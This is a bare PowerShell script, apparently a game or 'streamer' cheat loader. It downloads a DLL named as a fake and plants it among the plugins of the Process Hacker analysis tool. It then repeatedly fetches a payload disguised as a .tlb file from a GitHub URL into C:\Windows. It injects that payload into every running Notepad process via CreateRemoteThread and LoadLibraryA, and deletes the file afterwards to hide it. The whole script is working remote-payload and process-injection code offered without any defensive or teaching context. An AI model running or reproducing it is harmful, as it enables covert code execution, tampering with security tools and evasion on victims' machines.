Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ExtendedNotificationsFake.dll" -OutFile "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"

# Constants
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"

# P/Invoke declarations
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

# Continuous monitoring loop
while ($true) {
    # Wait until Notepad is running
    do {
        $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    } while (-not $notepad)

    # Download DLL
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
        Write-Host "✅ DLL downloaded." -ForegroundColor Green
    } catch {
        Write-Host "❌ Failed to download DLL." -ForegroundColor Red
        continue
    }

    # Inject into each running Notepad process
    foreach ($proc in $notepad) {
        $processId = $proc.Id
        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)

        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "❌ Cannot open Notepad process (PID: $processId)" -ForegroundColor Red
            continue
        }

        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

        if ($allocMem -eq [IntPtr]::Zero) {
            Write-Host "❌ Memory allocation failed for PID $processId" -ForegroundColor Red
            continue
        }

        $outSize = [IntPtr]::Zero
        $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$outSize)

        if (-not $writeResult) {
            Write-Host "❌ Failed to write memory in Notepad (PID: $processId)" -ForegroundColor Red
            continue
        }

        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

        if ($loadLibraryAddr -eq [IntPtr]::Zero) {
            Write-Host "❌ LoadLibraryA not found." -ForegroundColor Red
            continue
        }

        $threadId = [IntPtr]::Zero
        $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)

        if ($hThread -eq [IntPtr]::Zero) {
            Write-Host "❌ Thread creation failed for PID: $processId" -ForegroundColor Red
        } else {
            Write-Host "✅ DLL injected into Notepad (PID: $processId)" -ForegroundColor Cyan
        }
    }

    # Wait a few seconds then delete the DLL
    Start-Sleep -Seconds 5
    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
    Write-Host "🧹 DLL deleted. Monitoring continues..." -ForegroundColor Yellow

    # Wait until all Notepad instances are closed
    do {
        $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    } while ($notepad)

    Write-Host "🔁 Notepad closed. Restarting monitor..." -ForegroundColor Gray
}
